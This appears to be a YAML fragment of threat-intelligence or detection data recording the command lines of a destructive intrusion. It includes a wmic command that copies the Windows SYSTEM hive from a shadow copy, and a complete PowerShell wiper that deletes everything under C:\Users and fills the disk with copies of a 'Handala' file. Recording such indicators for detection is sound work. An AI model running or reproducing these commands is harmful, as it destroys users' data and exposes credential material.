  - cmd.exe
  - powershell.exe
  - rundll32.exe
  - wmic.exe
  commandline:
  - wmic.exe /node:[REDACTED_HOSTNAME] /user:[REDACTED] /password:[REDACTED] process call create "cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\users\public"
  powershell:
  - '$usersFolder = C:\Users # Ensure the folder exists if (Test-Path $usersFolder)
    { # Get all items in C:\Users, but not the Users folder itself $items = Get-ChildItem
    -Path $usersFolder -Recurse # Remove each item (files and subfolders) inside C:\Users
    foreach ($item in $items) { try { Remove-Item -Path $item.FullName -Recurse -Force
    -ErrorAction Stop } catch { Write-Host Could not delete: $($item.FullName) } }
    } $sourceFile = \\[REDACTED]\SYSVOL\[REDACTED]\scripts\Administration\install\handala.rar
    $destinationFolder = C:\users if (!(Test-Path $destinationFolder)) { New-Item
    -ItemType Directory -Path $destinationFolder | Out-Null } $driveLetter = (Split-Path
    $destinationFolder -Qualifier).TrimEnd('':'',''\'') $i = 0 while ((Get-PSDrive
    $driveLetter).Free -gt (Get-Item $sourceFile).Length) { Copy-Item $sourceFile
    $destinationFolder\Handala_$i.gif $i++ }'
